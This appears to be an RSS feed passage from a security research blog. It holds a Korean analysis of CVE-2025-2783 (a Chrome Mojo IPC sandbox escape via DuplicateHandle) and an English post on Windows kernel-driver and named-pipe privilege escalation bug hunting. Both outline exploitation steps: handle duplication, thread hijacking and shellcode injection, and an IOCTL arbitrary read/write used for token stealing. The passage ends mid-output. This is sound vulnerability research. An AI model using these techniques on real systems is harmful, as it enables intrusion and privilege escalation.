&#xD578;&#xB4E4;&#xC744; &#xCCB4;&#xD06C;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xC11C; &#xB192;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xADF8; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD5C8;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p><strong><em>Phase 1: &#xCDE8;&#xC57D;&#xD55C; IPC &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4; (<code>ipcz</code> &#xB808;&#xC774;&#xC5B4;)</em></strong></p><p>Chrome&#xC740; &#xCD5C;&#xADFC; Mojo&#xC758; &#xBC31;&#xC5D4;&#xB4DC;&#xB85C; <code>ipcz</code>(IPCZ: Inter-Process Communication Zero-copy)&#xB97C; &#xB3C4;&#xC785;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774; &#xB808;&#xC774;&#xC5B4;&#xC758; <code>NodeLink::RelayMessage</code> &#xD568;&#xC218;&#xB97C; &#xD0C0;&#xAC9F;&#xD305;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xC815;&#xC0C1;&#xC801;&#xC778; &#xD750;&#xB984;:</strong><br>IPC &#xBA54;&#xC2DC;&#xC9C0;&#xB294; <code>MessagePipe</code>&#xB97C; &#xD1B5;&#xD574; &#xC9C1;&#xB82C;&#xD654;&#xB418;&#xC5B4; &#xC804;&#xC1A1;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xD578;&#xB4E4;&#xACFC; &#xAC19;&#xC740; &#xB9AC;&#xC18C;&#xC2A4;&#xB294; OS &#xB808;&#xBCA8;&#xC5D0;&#xC11C; &#xBCF5;&#xC81C;&#xB418;&#xC5B4; &#xC804;&#xB2EC;&#xB418;&#xB294;&#xB370;, &#xC218;&#xC2E0; &#xCE21;&#xC740; &#xBA54;&#xC2DC;&#xC9C0; &#xD5E4;&#xB354;(Message ID)&#xB97C; &#xBCF4;&#xACE0; &#xC5B4;&#xB5A4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAE30;&#xB300;&#xD574;&#xC57C; &#xD560;&#xC9C0; &#xC54C;&#xACE0; &#xAC80;&#xC99D;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</li><li><p><strong>&#xCDE8;&#xC57D;&#xC810; &#xD2B8;&#xB9AC;&#xAC70; (Bug):</strong><br>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC815;&#xC758;&#xB418;&#xC9C0; &#xC54A;&#xC740; Message ID (<code>0x69</code>)&#xB97C; &#xD3EC;&#xD568;&#xD55C; <code>RelayMessage</code>&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p>  <pre><code class="hljs cpp"><span class="hljs-comment">// &#xACF5;&#xACA9;&#xC790; &#xCF54;&#xB4DC; (Renderer &#xB0B4;&#xBD80;) // ID: 0x69 (Undefined)</span>ipcz::Message::Message_unsigned_char__unsigned_long_long_(v23, <span class="hljs-number">0x69</span>, ...); <span class="hljs-comment">// ... &#xD578;&#xB4E4; &#xB370;&#xC774;&#xD130; &#xC870;&#xC791; ...</span>ipcz::NodeLink::RelayMessage(...); <span class="hljs-comment">// &#xBA54;&#xC2DC;&#xC9C0; &#xC804;&#xC1A1;</span></code></pre></li></ul><p><strong><em>Phase 2: Broker&#xC758; &#xAC80;&#xC99D; &#xBD80;&#xC7AC; &#xBC0F; <code>DuplicateHandle</code> &#xC624;&#xC6A9;</em></strong></p><p>Browser Process&#xAC00; &#xC774; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC218;&#xC2E0;&#xD588;&#xC744; &#xB54C;, &#xD578;&#xB4E4;&#xB7EC;&#xB294; <code>0x69</code> ID&#xB97C; &#xAC00;&#xC9C4; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xBA74;&#xC11C; &#xCE58;&#xBA85;&#xC801;&#xC778; &#xC2E4;&#xC218;&#xB97C; &#xBC94;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><strong>Blind Unmarshalling:</strong> &#xC218;&#xC2E0; &#xCE21; &#xD568;&#xC218;(<code>0x18001E350</code>)&#xB294; &#xBA54;&#xC2DC;&#xC9C0; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC758; &#xC624;&#xD504;&#xC14B; <code>0xC8</code> &#xC704;&#xCE58;&#xC5D0; &#xC788;&#xB294; &#xAC12;&#xC744; <code>WrappedPlatformHandle</code> &#xAC1D;&#xCCB4;&#xB85C; &#xAC04;&#xC8FC;&#xD558;&#xACE0; &#xC77D;&#xC5B4;&#xB4E4;&#xC785;&#xB2C8;&#xB2E4;.</li><li><p><strong>&#xAC80;&#xC99D; &#xC5C6;&#xB294; &#xD578;&#xB4E4; &#xBCF5;&#xC81C;:</strong> &#xC77D;&#xC5B4;&#xB4E4;&#xC778; &#xAC12;(&#xACF5;&#xACA9;&#xC790;&#xAC00; &#xBCF4;&#xB0B8; &#xD578;&#xB4E4; &#xAC12;)&#xC774; &#xC720;&#xD6A8;&#xD55C;&#xC9C0;, &#xD639;&#xC740; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB41C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC811;&#xADFC;&#xD574;&#xC11C;&#xB294; &#xC548; &#xB418;&#xB294; &#xD578;&#xB4E4;&#xC778;&#xC9C0; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; <code>DuplicateHandle</code> API&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs cpp"><span class="hljs-comment">// Browser Process (&#xCDE8;&#xC57D;&#xD55C; &#xD578;&#xB4E4;&#xB7EC; &#xC758;&#xC0AC; &#xCF54;&#xB4DC;)</span>HANDLE from_message = ExtractHandleFromMsg(message + <span class="hljs-number">0xC8</span>); <span class="hljs-comment">// &#xAC80;&#xC99D; &#xC5C6;&#xC74C;</span>HANDLE TargetHandle;<span class="hljs-comment">// &#xD604;&#xC7AC; &#xD504;&#xB85C;&#xC138;&#xC2A4;(Browser)&#xC758; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD578;&#xB4E4;&#xC744; &#xBCF5;&#xC81C;&#xD574;&#xBC84;&#xB9BC;</span><span class="hljs-keyword">if</span> (DuplicateHandle(GetCurrentProcess(), from_message, GetCurrentProcess(), &amp;TargetHandle, ...)) {    <span class="hljs-comment">// &#xC131;&#xACF5; &#xC2DC;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC6D0;&#xD558;&#xB294; &#xD578;&#xB4E4;&#xC774; Browser &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB0B4;&#xC5D0;&#xC11C; &#xC720;&#xD6A8;&#xD574;&#xC9D0;</span>}</code></pre></li></ol><p>&#xC774; &#xC815;&#xC5D0;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294; Broker(Browser) &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC18C;&#xC720;&#xD55C; &#xAC15;&#xB825;&#xD55C; &#xD578;&#xB4E4;&#xC774;&#xB098;, Broker &#xC790;&#xC2E0;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD578;&#xB4E4;&#xC744; &#xD68D;&#xB4DD;&#xD558;&#xAC70;&#xB098; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB294; Primitive&#xB97C; &#xC5BB;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Exploitation-Code-Execution"><a href="#Exploitation-Code-Execution" class="headerlink" title="Exploitation: Code Execution"></a>Exploitation: Code Execution</h3><p><code>DuplicateHandle</code>&#xC744; &#xD1B5;&#xD574; Broker &#xD504;&#xB85C;&#xC138;&#xC2A4;(&#xD639;&#xC740; &#xC0C1;&#xC704; &#xAD8C;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4;)&#xC5D0; &#xB300;&#xD55C; &#xC81C;&#xC5B4;&#xAD8C;(Handle)&#xC744; &#xC5BB;&#xC740; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC808;&#xCC28;&#xB85C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><strong>Thread Hijacking:</strong> &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD68D;&#xB4DD;&#xD55C; &#xC0C1;&#xC704; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xD578;&#xB4E4;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB0B4;&#xC758; thread contect&#xC744; &#xC81C;&#xC5B4;&#xD569;&#xB2C8;&#xB2E4;.<ul><li><code>SuspendThread(TargetThread)</code>: &#xD0C0;&#xAC9F; &#xC2A4;&#xB808;&#xB4DC; &#xBA48;&#xCDA4;</li><li><code>GetThreadContext(...)</code>: &#xD604;&#xC7AC; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xC0C1;&#xD0DC; &#xBC31;&#xC5C5;</li><li><code>SetThreadContext(...)</code>: RIP&#xB97C; ROP &#xAC00;&#xC82F;&#xC774;&#xB098; &#xC258;&#xCF54;&#xB4DC;&#xAC00; &#xC788;&#xB294; &#xC8FC;&#xC18C;&#xB85C; &#xBCC0;&#xACBD;</li></ul></li><li><strong>Shellcode Injection:</strong><ul><li><code>WriteProcessMemory</code>: &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xBC16;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC5D0; &#xC545;&#xC131; &#xC258;&#xCF54;&#xB4DC;&#xB97C; &#xC501;&#xB2C8;&#xB2E4;.</li><li>&#xAC00;&#xC82F;(<code>EBFE</code> &#xB4F1;)&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC2A4;&#xB808;&#xB4DC;&#xB97C; &#xBB34;&#xD55C;&#xB8E8;&#xD504;&#xC5D0; &#xBE60;&#xB728;&#xB9AC;&#xAC70;&#xB098; &#xD2B9;&#xC815; &#xD750;&#xB984;&#xC73C;&#xB85C; &#xC720;&#xB3C4;&#xD55C; &#xB4A4;, &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>ResumeThread</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC258;&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li></ol><h2 id="Outro"><a href="#Outro" class="headerlink" title="Outro"></a>Outro</h2><p>&#xC77C;&#xBC18;&#xC801;&#xC778; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xD0C8;&#xCD9C;&#xC740; &#xCEE4;&#xB110;(Win32k.sys &#xB4F1;) &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xAC70;&#xB098;, &#xBCF5;&#xC7A1;&#xD55C; &#xB85C;&#xC9C1; &#xBC84;&#xADF8;&#xB97C; &#xC5F0;&#xC1C4;&#xC801;&#xC73C;&#xB85C; &#xC774;&#xC6A9;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#x201C;Mojo IPC &#xBA54;&#xC2DC;&#xC9C0; &#xD558;&#xB098;&#x201D;&#xB85C; &#xB17C;&#xB9AC;&#xC801;&#xC778; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD578;&#xB4E4; &#xC720;&#xD6A8;&#xC131;&#xC5D0; &#xB300;&#xD574; &#xAC80;&#xC99D; &#xB3C4;&#xC785;&#xC774; &#xB418;&#xC5C8;&#xACE0; </p><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (!IsValidMojoHandle(handle)) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// Invalid &#xBA54;&#xC2DC;&#xC9C0; &#xCC28;&#xB2E8;</span></code></pre><p>&#xAE30;&#xB2A5; &#xC2E4;&#xD589; &#xC870;&#xAC74; &#xAC15;&#xD654;&#xB294; &#xC2DD;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xAC00; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">IsEscapeCodeAllowed</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; code)</span> </span>{    <span class="hljs-keyword">return</span> code == <span class="hljs-string">&quot;safe_mode&quot;</span> || code == <span class="hljs-string">&quot;internal_debug&quot;</span>;}</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2783">https://nvd.nist.gov/vuln/detail/CVE-2025-2783</a></p><p><a href="https://securelist.com/operation-forumtroll/115989/">https://securelist.com/operation-forumtroll/115989/</a></p><p><a href="https://www.kaspersky.com/blog/forum-troll-apt-with-zero-day-vulnerability/53215/">https://www.kaspersky.com/blog/forum-troll-apt-with-zero-day-vulnerability/53215/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/Google/">Google</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chrome/">Chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/Sandbox-Escape/">Sandbox Escape</category>
      
      <category domain="https://hackyboiz.github.io/tags/Mojo-IPC/">Mojo IPC</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-2783/">CVE-2025-2783</category>
      
      
      <comments>https://hackyboiz.github.io/2026/01/14/OUYA77/2026-01-14/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows LPE Bug Hunting, Served by the Team’s Youngest: Part 1 (EN)</title>
      <link>https://hackyboiz.github.io/2025/12/28/banda/WHS3-bughunting/en/</link>
      <guid>https://hackyboiz.github.io/2025/12/28/banda/WHS3-bughunting/en/</guid>
      <pubDate>Sun, 28 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/12/28/banda/WHS3-bughunting/en/logo_window.png&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/12/28/banda/WHS3-bughunting/en/logo_window.png" alt></p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Hello, 2025 is already coming to an end. Is everyone enjoying the end of the year? &#x1F385; Some of our team members participated in a project at the Whitehat School on the topic of &#x2018;Windows Kernel Driver &amp; Named Pipe LPE Bug Hunting&#x2019;. It was back in May 2025&#x2026; I&#x2019;m banda, and I started looking for Windows vulnerabilities after our mentor simply said, &#x2018;Join the project.&#x2019;</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image1.png" alt></p><p>Today, I&#x2019;ll be writing Part 1, focusing on sharing some great bug hunting tips, especially on the Kernel Driver &amp; Named Pipe vectors! Also, our team members will be covering more informative content in the upcoming series, so please make sure to read them! In this series, we will look at the two elements, Kernel Driver and Named Pipe, as separate LPE attack surfaces and introduce the vulnerabilities we found.</p><h2 id="Chapter-1-Kernel-Driver-as-an-Attack-Surface"><a href="#Chapter-1-Kernel-Driver-as-an-Attack-Surface" class="headerlink" title="Chapter 1: Kernel Driver as an Attack Surface"></a>Chapter 1: Kernel Driver as an Attack Surface</h2><h3 id="1-1-Overview-of-the-Kernel-Driver-Attack-Surface"><a href="#1-1-Overview-of-the-Kernel-Driver-Attack-Surface" class="headerlink" title="1.1 Overview of the Kernel Driver Attack Surface"></a><strong>1.1 Overview of the Kernel Driver Attack Surface</strong></h3><p>In the Windows environment, LPE vulnerabilities often occur due to a lack of trust boundary validation between user mode and kernel mode, making kernel drivers a good target. A WDM-structured kernel driver basically processes an IRP (<code>IRP_MJ_DEVICE_CONTROL</code>) and receives the IOCTL code and the lengths of the input and output buffers from the kernel through the <code>IO_STACK_LOCATION</code> structure. At this point, it accesses the user input buffer through each field of the IRP structure depending on the IOCTL transfer method!</p><p>Especially in WDM with <code>METHOD_BUFFERED</code>, the I/O Manager allocates a kernel buffer and provides its pointer as <code>Irp-&gt;AssociatedIrp.SystemBuffer</code>, with both input and output passing through this buffer. In other words, vulnerabilities can arise because this IOCTL processing logic is designed to interpret user input within the kernel address space, and because the I/O Manager does not perform validation on user input when constructing the IRP. Keeping this in mind, let&#x2019;s look at the process of collecting and analyzing targets.</p><h3 id="1-2-Kernel-Driver-Target-Collection"><a href="#1-2-Kernel-Driver-Target-Collection" class="headerlink" title="1.2 Kernel Driver Target Collection"></a>1.2 Kernel Driver Target Collection</h3><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image2.png" alt></p><p>First, I need to quickly find the third-party drivers I&#x2019;ve installed, right? In the first step, I use FolderChangesView to track the <code>.sys</code> files created in the user environment, checking the created sys file names and their paths.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image3.png" alt></p><p>Since we need to analyze drivers that are actually loaded and running in the kernel, the next step is to use DriverView to check the list of currently loaded drivers. A loaded state means that the IOCTL and IRP processing routines are active, right?</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image4.png" alt></p><p>And we created a simple automation tool to extract <code>.sys</code> files through FolderChangesView and copy them from the driver&#x2019;s directory to an analysis directory. We can start the analysis by checking if the extracted files have been moved correctly to the analysis directory.</p><h3 id="1-3-Kernel-Driver-Analysis"><a href="#1-3-Kernel-Driver-Analysis" class="headerlink" title="1.3 Kernel Driver Analysis"></a>1.3 Kernel Driver Analysis</h3><p>Driver analysis can be performed in the following order.</p><ol><li>Exposed <code>DeviceName</code> &#x2192; Determine user accessibility</li><li>Check accessibility of the <code>\Device</code> node with WinObj</li><li>Start WDM driver analysis using IDA/Plugins</li><li>Identify IOCTL Table through IDA</li><li>Analyze <code>DispatchRoutine</code> &#x2192; Check input validation parts/structures/fields</li><li>Perform dynamic analysis by tracing function flow/Device request processing with WinDBG</li></ol><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image5.png" alt></p><p>The first step is to check if the Device and Symlink are exposed in DriverEntry. If, for example, a Device Name like <code>\Device\PdFwKrnl</code> and a Symlink like <code>\DosDevices\PdFwKrnl</code> are created, it means we have secured a possible entry point to send requests to the driver from user mode using <code>CreateFile/DeviceControl</code>. We then check which dispatch routine (<code>DispatchDeviceControl</code>) <code>IRP_MJ_DEVICE_CONTROL</code> is connected to through the <code>DriverObject-&gt;MajorFunction</code> table.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image6.png" alt></p><p>Once we have information about <code>\Device</code>, we need to check if this driver exposes an actually accessible entry point from user mode and how access control is configured. In WinObj, we verify that the Device Object we found is actually created under <code>\Device</code> and also check for the existence of a Symlink. Then, we open the Security tab for both the Device and Symlink to ensure that a general user (Everyone) has Read/Write permissions! This is necessary for a general user to open a handle and send IOCTL requests.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image7.png" alt></p><p>Afterward, I quickly identified the main dispatch routines using IDA&#x2019;s DriverBuddy and determined it was a WDM driver. DriverBuddy helps find traces of kernel API calls, and as an example, we can see that call points like <code>MmMapIoSpace</code>, <code>MmUnmapIoSpace</code>, <code>MmBuildMdlForNonPagedPool</code>, and <code>MmMapLockedPages</code> are located near <code>DispatchDeviceControl</code>. In particular, a routine like <code>MmMapIoSpace</code> that maps a physical address to a kernel virtual address can become a vulnerability if an attacker can indirectly control the physical address, length, and cache type. So, in my case, I will designate this as an analysis vector and analyze the code.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image8.png" alt></p><p>Then, I proceed to reverse-engineer the IOCTL branching structure based on the switch-case inside <code>DispatchDeviceControl</code>. In the case of the WDM driver above, you can see that specific IOCTL Cases branch in the form of <code>0x80002000</code>, <code>0x80002004</code>, <code>0x8000201C</code>&#x2026; within the <code>DispatchDeviceControl</code>&#x2018;s switch-case. Here, I was able to identify the IOCTL Case directly linked to the <code>MmMapIoSpace</code> call. By classifying these cases based on their behavior, you can check how input validation for things like option values, lengths, and pointer handling is processed.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image9.png" alt></p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image10.png" alt></p><p>For example, the key point in this analysis is the <code>0x8000202C</code> case. In this case, a flow appears where specific offset values from the input buffer within the IRP are interpreted as arguments like <code>dst</code>/<code>src</code>/<code>size</code>, extracted, and passed to <code>memmove</code>. From a WDM perspective, if the IOCTL in the <code>DeviceIoControl</code> path is <code>METHOD_BUFFERED</code>, the I/O Manager places the address of a kernel-allocated buffer into <code>IRP&#x2192;AssociatedIrp.SystemBuffer</code> and fills that buffer with content copied from the user input.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image11.png" alt></p><p>Checking how to enter the <code>0x8000202C</code> case, if the input buffer length is just <code>0x38</code>, it trusts the values taken from offsets (+<code>0x20</code>/+<code>0x28</code>/+<code>0x30</code>) within that buffer as a pointer/length and passes them to <code>memmove(dst, src, size)</code>. This confirms that a read/write primitive can be established in this way.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image12.png" alt></p><p>Afterward, you can follow the function flow in WinDBG using the information obtained from static analysis. We confirmed earlier that in the <code>0x8000202C</code> case, the values from <code>SystemBuffer(rsi)+0x20/0x28/0x30</code> are put into <code>memmove(dst, src, size)</code>. If you write a payload and check the area around the <code>SystemBuffer</code> of <code>METHOD_BUFFERED</code> pointed to by <code>rsi</code>&#x2026; you can see that it&#x2019;s overwritten with &#x2018;A&#x2019;s as intended, right?</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image13.png" alt></p><p>Once the vulnerability is confirmed, it&#x2019;s time to exploit it. For example, in the case above, if you call <code>DeviceIoControl</code> with <code>dst=output_buf</code> (user address), <code>src=desired kernel address to read</code>, and <code>size=8</code> in the IOCTL input structure, the kernel performs <code>memmove(dst, src, size)</code>, establishing an 8-byte arbitrary read. Using the familiar <code>NtQuerySystemInformation</code> handle table (for Windows bug hunters) to get the EPROCESS address, we add TOKENOFFSET to the obtained SYSTEM EPROCESS address to read the <code>EPROCESS-&gt;Token</code> value. Then, in the same way, we find the current EPROCESS address, calculate the Token field&#x2019;s location, and perform an Arbitrary Write by setting <code>dst=current EPROCESS+TOKENOFFSET</code>, <code>src=prepared SYSTEM token pointer</code>, and <code>size=8</code> in the IOCTL to achieve privilege escalation. As you can see, the detailed payload construction depends on the type of vulnerability found.</p><h2 id="Chapter-2-Named-Pipe-as-an-Attack-Surface"><a href="#Chapter-2-Named-Pipe-as-an-Attack-Surface" class="headerlink" title="Chapter 2: Named Pipe as an Attack Surface"></a>Chapter 2: Named Pipe as an Attack Surface</h2><h3 id="2-1-Overview-of-the-Named-Pipe-Attack-Surface"><a href="#2-1-Overview-of-the-Named-Pipe-Attack-Surface" class="headerlink" title="2.1 Overview of the Named Pipe Attack Surface"></a>2.1 Overview of the Named Pipe Attack Surface</h3><p>Now that we&#x2019;ve looked at kernel drivers, it&#x2019;s time to examine Named Pipes. This section assumes a slight understanding of the Named Pipe communication method, so I recommend checking out the related research article <a href="https://hackyboiz.github.io/2025/05/12/ogu123/NamedPipe/EN/">&#x1F449;here</a>! Although Named Pipes are used as an IPC communication mechanism, they are managed as kernel objects and, like kernel drivers, are frequently used by SYSTEM-privileged processes to communicate with user mode. In particular, there are many cases where a service process trusts the Named Pipe input as an internal message, parses it into a structure, or connects it to sensitive operations like permission changes, registry actions, or process execution. A lack of validation can lead to LPE. Curious about how to approach IPC differently from IOCTL? Let&#x2019;s find out!</p><h3 id="2-2-Named-Pipe-Target-Collection"><a href="#2-2-Named-Pipe-Target-Collection" class="headerlink" title="2.2 Named Pipe Target Collection"></a>2.2 Named Pipe Target Collection</h3><p>General target collection proceeds in the following order: (1) select SYSTEM/service process candidates, (2) obtain the pipe handles opened by that process, and then (3) check if non-administrators like Everyone have Read/Write access through the pipe&#x2019;s ACL.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image14.png" alt></p><p>I start by selecting process candidates using Process Explorer. My criteria for narrowing down targets are checking if the execution account is a SYSTEM process, if it&#x2019;s a third-party service, if a Named Pipe exists in its HANDLEs, and if its Integrity Level is SYSTEM.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image15.png" alt></p><p>You can find out if a NamedPipe exists in the Handles tab at the bottom of Process Explorer. An item with Type &#x2018;File&#x2019; and a Name starting with <code>\Device\NamedPipe\...</code> is a Named Pipe. The collected <code>\Device\NamedPipe\...</code> path becomes the mapping point in user mode, like <code>\\.\pipe\...</code>.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image16.png" alt></p><p>However, there&#x2019;s one major hurdle left&#x2026; the ACL. If you go through the trouble of confirming a Named Pipe exists but can&#x2019;t read or write to it&#x2026; you have to say goodbye to that Named Pipe. &#x1F62D; If only Administrators have RW access and others have no permissions, it&#x2019;s hard to see it as a successful LPE vector. You need to use a tool like accesschk to inspect the pipe&#x2019;s ACL and check if broad groups like Everyone, Authenticated Users, or Users have RW access, then narrow down your targets.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image17.png" alt></p><p>Once a target is selected, the target collection process is completed by opening the binary, quickly searching for APIs like <code>CreateNamedPipeA/W</code>, <code>ConnectNamedPipe</code>, and <code>DisconnectNamedPipe</code> to confirm it&#x2019;s a server implementation, and then analyzing the code by checking the <code>Connect &#x2192; Read</code> flow, parsing branches, and permission-related branches like token/access control.</p><h3 id="2-3-Named-Pipe-Analysis"><a href="#2-3-Named-Pipe-Analysis" class="headerlink" title="2.3 Named Pipe Analysis"></a>2.3 Named Pipe Analysis</h3><p>The analysis could be conducted in the following order.</p><ol><li>Select server (SYSTEM service) process candidates with Process Explorer.</li><li>Verify if the collected <code>\Device\NamedPipe\...</code> is the connection point for <code>\\.\pipe\...</code> in user mode.</li><li>Check Pipe ACL with accesschk &#x2192; Verify if Read/Write is open for broad groups like Everyone.</li><li>In IDA, trace the flow like <code>CreateNamedPipe*</code> &#x2192; <code>ConnectNamedPipe</code> &#x2192; <code>ReadFile/WriteFile</code> and identify the request handling function dispatch.</li><li>Narrow down to branches where a request leads to privilege-sensitive operations like registry/HKLM access or service configuration.</li><li>Perform dynamic analysis by capturing events with ProcMon.</li></ol><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image18.png" alt></p><p>Once a target is set, dynamic analysis begins by using ProcMon to see what vulnerable behavior the pipe I/O leads to. First, narrow down the server process that creates and receives the pipe and the client process that connects and sends to the pipe. Then, prepare to trace IPC call flows like <code>CreateNamedPipe</code>, <code>CreateFile</code>, <code>ReadFile</code>, and <code>WriteFile</code> within the scope of those processes. It&#x2019;s a good practice to register filters for registry key-related events or core named pipe I/O events under &#x2018;Process Name&#x2019; and &#x2018;Operation&#x2019;, and to fix the filter for the server&#x2019;s Integrity Level as System. This makes it easier to check if user input can lead to privilege escalation to SYSTEM.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image19.png" alt></p><p>As it happens, the program I analyzed has a checkbox in its settings that allows Non-Admins some administrative functions via Access Control. It makes sense for an antivirus. But this isn&#x2019;t typical, and even when I keep clicking the &#x201C;Allow setting changes / disable protection&#x201D; checkbox as a non-administrator, no UAC prompt appears. Suspicious, right? Let&#x2019;s prioritize this service for investigation.</p><pre><code class="hljs c">PS C:\Users\banda\Downloads\AccessChk&gt; .\accesschk.exe -accepteula -lv <span class="hljs-string">&quot;\pipe\K7TSMngrService1&quot;</span>\\.\Pipe\K7TSMngrService1  DESCRIPTOR FLAGS:      [SE_DACL_PRESENT]      [SE_SACL_PRESENT]      [SE_SACL_AUTO_INHERITED]      [SE_SELF_RELATIVE]  OWNER: NT AUTHORITY\SYSTEM  LABEL: Low Mandatory Level        SYSTEM_MANDATORY_LABEL_NO_WRITE_UP  ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM        FILE_ADD_FILE        FILE_CREATE_PIPE_INSTANCE        FILE_APPEND_DATA        FILE_LIST_DIRECTORY        FILE_READ_ATTRIBUTES        FILE_READ_DATA        FILE_READ_EA        FILE_WRITE_ATTRIBUTES        FILE_WRITE_DATA        FILE_WRITE_EA        SYNCHRONIZE        READ_CONTROL  ACCESS_ALLOWED_ACE_TYPE: Everyone        FILE_ADD_FILE        